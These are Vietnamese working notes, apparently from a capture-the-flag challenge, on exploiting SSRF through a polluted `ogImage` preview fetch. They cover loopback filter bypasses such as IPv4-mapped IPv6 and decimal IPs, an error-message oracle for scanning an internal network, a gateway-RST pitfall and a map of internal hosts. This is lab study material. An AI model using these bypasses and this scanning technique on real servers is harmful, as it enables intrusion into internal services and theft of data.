# 03 — SSRF qua `ogImage` + oracle

## Cơ chế fetch

Sau khi pollute `ogImage`, `GET /api/preview` khiến server fetch URL đó bằng
undici (Node) và trả diagnostics plain-text:

```
HTTP <code> from <url> is not an image; preview: <300 ký tự đầu của body>
```

→ Đây là **kênh đọc dữ liệu nội bộ hoàn chỉnh**: mọi endpoint trả về text đều
đọc được body (300 ký tự đầu).

## Filter host — bản đồ đầy đủ

Filter chạy trên hostname **trước khi fetch** (normalize case-insensitive,
strip trailing dot), chỉ cho phép `http:`:

| Bị chặn (`refused to fetch ... host not allowed`) | Lọt qua |
|---|---|
| `127.0.0.1`, `localhost` (mọi case, kèm trailing dot) | `[::1]` (IPv6 loopback) |
| `0.0.0.0`, `0/` | **`[::ffff:127.0.0.1]`** (IPv4-mapped) ← chìa khóa cuối |
| `0x7f000001`, `2130706433`, `0177.0.0.1` (hex/dec/octal) | hostname `portalis` → 172.18.0.3 |
| `file:`, `data:`, `https:` | IP nội bộ `172.18.0.x` |
| userinfo `foo@127.0.0.1` | port lạ (nếu có service) |

Chi tiết parser (test riêng):
- `http://2886860803:3000/` (decimal IP) → **lọt**, resolve 172.18.0.3
- `http://0xAC.1.0.3/` → lọt nhưng parse khác (172.1.0.3) — hex từng octet KHÔNG chuẩn
- port `03000` = :3000; port `65536` bị filter chặn; port `0` → 80
- CRLF `%0d%0a`/`%0a` trong path → bị giữ nguyên encoded, không splitting
- `//api/flag` → 404; `/./api/flag` → 403 (route match có normalize)

**Schema check tường minh**: `https://` → `Protocol "https:" not supported. Expected "http:"`.

## Error oracle (không cần response cũng biết thông tin)

```
fetch failed: getaddrinfo ETIMEOUT <host>       → host không resolve
fetch failed: connect ECONNREFUSED <ip>:<port>  → leak IP đã resolve + port trạng thái
```

ECONNREFUSED leak **IP thực** sau resolve (dùng để scan network + fingerprint).

## ⚠️ Bẫy lớn nhất của network này: gateway spoof RST

Control-test (quan trọng — đây là điều khiến các phiên trước kết luận sai):

```
http://203.0.113.7:3000/x  → ECONNREFUSED   (IP TEST-NET, không tồn tại thật)
http://192.0.2.99:3000/x   → ECONNREFUSED   (TEST-NET-2)
http://172.18.99.99:3000/x → ECONNREFUSED   (subnet không dùng)
```

→ **Gateway trả RST thay vì drop cho mọi dest không routable.** Trên network
này `ECONNREFUSED` KHÔNG có nghĩa là "host sống, port đóng". Chỉ có HTTP
response thật mới là bằng chứng tồn tại. (Một lần subnet-sweep cho ra ~20 host
"ALIVE" giả trên 172.16-21/10.x/192.168.x — toàn nhiễu.)

## Network map (chỉ những gì có bằng chứng HTTP)

```
172.18.0.3         app "portalis" (hostname DNS nội bộ duy nhất resolve)
172.18.0.2         = 172.18.0.3 — CÙNG app (body byte-identical qua SSRF so sánh)
172.18.0.1         gateway: DROP mọi port từ trong (nginx 502 không tới được)
[::1]:3000         app qua IPv6 loopback
[::ffff:127.0.0.1] IPv4 loopback — không gian riêng, service ẩn nằm ở đây (:9001)
```

- Egress chặn tuyệt đối (1.1.1.1/8.8.8.8 → ECONNREFUSED; DNS ngoài ETIMEOUT)
- Hairpin về public IP cũng chết (91.107.189.166 từ trong → refused)
- 16 hostname service DNS enum: chỉ `portalis` resolve
- Cloud metadata (169.254.169.254, 169.254.170.2): refused
- Docker compose name variants (`portalis-1`, `web-1`, ...): không resolve

## Trục trặc vận hành của oracle

- **Fetch treo = preview treo**: khi `ogImage` trỏ vào host DROP (gateway), fetch
  undici treo → `/api/preview` treo → nginx bắn 502. Trông như "app chết" nhưng
  thực ra là oracle tự gác chính nó. Fix: sau mỗi probe đặt lại
  `ogImage = http://172.18.0.9:1/` (refused tức thì) để preview luôn nhanh.
- **Stale result**: preview trả kết quả fetch trước. Sau khi PUT URL mới, phải
  poll và kiểm tra kết quả có nhắc URL mới không.
